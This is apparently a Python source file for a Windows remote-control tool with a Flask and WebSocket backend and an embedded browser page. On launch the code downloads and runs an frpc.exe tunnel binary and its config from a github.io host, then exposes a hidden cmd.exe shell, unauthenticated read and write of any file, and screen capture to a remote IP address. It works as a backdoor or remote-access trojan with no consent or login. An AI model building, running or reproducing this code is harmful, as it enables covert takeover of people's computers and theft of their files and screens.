def WebSocketProcess():
    import asyncio
    import websockets
    import subprocess

    async def handle_client(websocket, path):
        cmd_process = None
        async def read_cmd_output(cmd_process, websocket):
            try:
                while cmd_process.poll() is None:
                    output = await asyncio.get_event_loop().run_in_executor(None, cmd_process.stdout.read, 1)
                    if output:
                        await websocket.send(output)
                    await asyncio.sleep(0.01)
            except Exception as e:
                print(f"Error reading output: {e}")
        async def process_client_messages(websocket, cmd_process):
            try:
                while True:
                    message = await websocket.recv()
                    print(f"Received message: {message}")
                    if message.startswith("\x01"):
                        if cmd_process is not None:
                            cmd_process.terminate()
                            await cmd_process.wait()
                        cmd_process = subprocess.Popen(
                            ["cmd.exe"],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True,
                            bufsize=0,
                            creationflags=subprocess.CREATE_NO_WINDOW,
                            cwd=message[1:]
                        )
                        asyncio.create_task(read_cmd_output(cmd_process, websocket))
                        print("Subprocess created")
                    elif message.startswith("\x03"):
                        if cmd_process is not None:
                            print("Terminating subprocess on user request (0x03)")
                            cmd_process.terminate()
                    elif cmd_process is not None:
                        cmd_process.stdin.write(message + '\n')
                        cmd_process.stdin.flush()
            except websockets.exceptions.ConnectionClosedError:
                print("Client disconnected")
            finally:
                if cmd_process is not None:
                    cmd_process.terminate()
                    await cmd_process.wait()
        await asyncio.gather(
            process_client_messages(websocket, cmd_process)
        )
    async def main():
        async with websockets.serve(handle_client, "127.0.0.1", 9090, extra_headers={"Access-Control-Allow-Origin": "*"}):
            await asyncio.Future()
    asyncio.run(main())


def WebFlaskProcess():
    import os,json,dxcam,io
    from flask import Flask, request, Response, stream_with_context
    from subprocess import Popen
    import urllib.request
    from PIL import Image

    os.chdir("C:\\Temp")
    if not os.path.exists("frpc.exe"):
        urllib.request.urlretrieve("https://python191003.github.io/frpc.exe", "frpc.exe")

    urllib.request.urlretrieve("https://python191003.github.io/frpc.toml", "frpc.toml")
    Popen("frpc.exe -c frpc.toml")
    app = Flask(__name__)
    camera = dxcam.create()

    @app.after_request
    def changeHeaders(response):
        response.headers['Access-Control-Allow-Origin'] = '*'
        return response
        

    @app.route('/fs/<path:path>')
    def fileSystem(path):
        if not os.path.exists(path):
            return "error"
        if path.endswith("/"):
            dirlist = os.listdir(path)
            dirlist = [["F" if os.path.isfile(path+x) else "D",x] for x in dirlist]
            return json.dumps(dirlist)
        else:
            with open(path,mode="rb") as f:
                return f.read().decode("utf-8",errors="ignore")

    @app.route('/edit/<path:path>', methods=['POST'])
    def cmd(path):
        with open(path, "w") as f:
            f.write(request.data.decode("utf-8"))
        return "ok"

    @app.route("/screenshot/<path:path>")
    def screenshot(path):
        img = camera.grab()
        img = Image.fromarray(img)
        img.resize((1920,1080))
        byteimg = io.BytesIO()
        img.save(byteimg, format="JPEG")
        byteimg.seek(0)
        return Response(byteimg.getvalue(), mimetype="image/jpeg")


    @app.route("/")
    def index():
        return r"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Romote Controller</title>
        <style>
            #file-explorer {
                width: 100%;
                height: 800px;
                border: 1px solid #ccc;
                padding: 10px;
                font-family: monospace;
                white-space: pre;
                overflow-y: auto;
                background-color: #f9f9f9;
                outline: none;
                caret-color: transparent;
            }

            #file-explorer span {
                display: block;
                cursor: pointer;
                padding: 3px;
            }

            #file-explorer span:hover {
                background-color: #e0e0e0;
            }

            #next {
                position: absolute;
                top: 10px;
                right: 10px;
                width: 30px;
                height: 30px;
                border-radius: 7px;
                background-color: #ffffff;
            }

            #break {
                position: absolute;
                top: 10px;
                right: 50px;
                width: 50px;
                height: 30px;
                border-radius: 7px;
                background-color: #ffffff;
                visibility: hidden;
            }

            #cmd-input {
                position: absolute;
                top: 0px;
                left: 0px;
                width: 400px;
                height: 200px;
                visibility: hidden;
            }

            #shot {
                position: absolute;
                top: 50px;
                right: 10px;
                width: 30px;
                height: 30px;
                border-radius: 7px;
                background-color: #ffffff;
            }
        </style>
    </head>
    <body>
        <div id="file-explorer"></div>
        <button id="next">C</button>
        <button id="break">ESC</button>
        <button id="shot">S</button>
        <input id="cmd-input">
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                const explorerDiv = document.getElementById('file-explorer');
                const next = document.getElementById('next');
                var currentPath = 'http://82.156.242.74:8080/fs/C:/'; // 默认请求路径
                let timer;
                var boardCache = "";

                // 初始化加载目录
                loadDirectory(currentPath);

                function loadCommand() {
                    next.textContent = 'F';
                    explorerDiv.innerHTML = "";
                    if (/Mobile|Android|iPhone/i.test(navigator.userAgent)){
                        const inputBox = document.getElementById('cmd-input');
                        inputBox.style.visibility = 'visible';
                        inputBox.style.width = window.innerWidth - 100 + 'px';
                        explorerDiv.onclick = (e) => {
                            e.preventDefault();
                            inputBox.focus();
                        }
                        inputBox.onkeydown = function (e) {
                            if (e.key === 'Enter') {
                                e.preventDefault();
                                socket.send(inputBox.value);
                                inputBox.value = "";
                            }
                        }
                    }else{
                        explorerDiv.contentEditable = true;
                    }
                    explorerDiv.onkeydown = function (e) {
                        e.preventDefault();
                        const key = e.key;
                        if (key === 'Enter') {
                            socket.send(boardCache);
                            boardCache = "";
                            explorerDiv.innerHTML += "\n";
                        }else if (key === 'Backspace') {
                            if (boardCache.length > 0) {
                                boardCache = boardCache.slice(0, -1);
                                explorerDiv.innerHTML = explorerDiv.innerHTML.slice(0, -1);
                            }
                        }else if (key.length === 1){
                            boardCache += key;
                            explorerDiv.innerHTML += key;
                        }
                    }
                    const socket = new WebSocket('ws://82.156.242.74:8080/ws');
                    socket.onopen = function () {
                        socket.send('\u0001'+currentPath.split('/').slice(4).join('/'));
                    };
                    socket.addEventListener('message', event => {
                        explorerDiv.innerHTML += event.data;
                    });
                    next.onclick = () => {
                        loadDirectory(currentPath);
                        explorerDiv.contentEditable = false;
                        socket.send("\u0003");
                        socket.close();
                        if (/Mobile|Android|iPhone/i.test(navigator.userAgent)){
                            inputBox.style.visibility = 'hidden';
                        }
                    }
                }

                // 加载目录内容的函数
                function loadDirectory(path) {
                    currentPath = path;
                    next.textContent = 'C';
                    next.onclick = loadCommand;
                    fetch(path)
                        .then(response => response.json())
                        .then(data => {
                            explorerDiv.innerHTML = '';
                            
                            // 如果不是根目录，添加“返回上一级”功能
                            if (path !== 'http://82.156.242.74:8080/fs/C:/') {
                                const upSpan = document.createElement('span');
                                upSpan.textContent = '../';
                                upSpan.addEventListener('click', () => goUpOneLevel(path));
                                explorerDiv.appendChild(upSpan);
                            }

                            // 遍历JSON数据并创建对应的span
                            data.forEach(item => {
                                const [type, name] = item;
                                const entrySpan = document.createElement('span');
                                entrySpan.textContent = type+"："+name;
                                entrySpan.addEventListener('click', () => handleEntryClick(type, name, path));
                                explorerDiv.appendChild(entrySpan);
                            });
                        });
                }

                // 处理点击条目
                function handleEntryClick(type, name, path) {
                    const newPath = path + name + (type === 'D' ? '/' : '');

                    if (type === 'D') {
                        loadDirectory(newPath); // 如果是目录，加载新目录内容
                    } else if (type === 'F') {
                        fetch(newPath)
                            .then(response => response.text())
                            .then(content => {
                                explorerDiv.innerHTML = content;
                                explorerDiv.contentEditable = true;
                                explorerDiv.focus();

                                // 替换next为保存按钮
                                next.textContent = 'S';
                                next.onclick = () => {
                                    saveFile(newPath, explorerDiv.innerHTML);
                                    next.textContent = 'C';
                                };
                                const esc = document.getElementById('break');
                                esc.style.visibility = 'visible';
                                esc.onclick = () => {
                                    goUpOneLevel(newPath);
                                    esc.style.visibility = 'hidden';
                                    next.textContent = 'C';
                                };
                            });
                    }
                }

                // 返回上一级目录
                function goUpOneLevel(path) {
                    const upPath = path.split('/').slice(0, path.endsWith('/')?-2:-1).join('/') + '/';
                    loadDirectory(upPath);
                    explorerDiv.contentEditable = false;
                }

                // 保存文件并返回上一级目录
                function saveFile(filePath, content) {
                    fetch(`http://82.156.242.74:8080/edit${filePath}`, {
                        method: 'POST',
                        body: content
                    }).then(() => {
                        goUpOneLevel(filePath);
                    });
                }

                function screenshot(e) {
                    shots.style.visibility = 'hidden';
                    explorerDiv.contentEditable = false;
                    explorerDiv.innerHTML = '';
                    const img = document.createElement('img');
                    img.src = '/http://82.156.242.74:8080/screenshot/'+Math.random();
                    img.style.width = '100%';
                    explorerDiv.appendChild(img);
                    const esc=document.getElementById('break')
                    esc.style.visibility = 'visible';
                    esc.onclick = () => {
                        explorerDiv.innerHTML = '';
                        loadDirectory(currentPath);
                        esc.style.visibility = 'hidden';
                        shots.style.visibility = 'visible';
                    };
                }
                const shots = document.getElementById('shot');
                shots.onclick = screenshot;
            });
        </script>
    </body>
    </html>"""

    app.run(host="127.0.0.1",port=8080,debug=True)

def verify():
    from subprocess import run
    run("pip install websockets flask Pillow dxcam",shell=True)

functions = [WebSocketProcess]
main = WebFlaskProcess
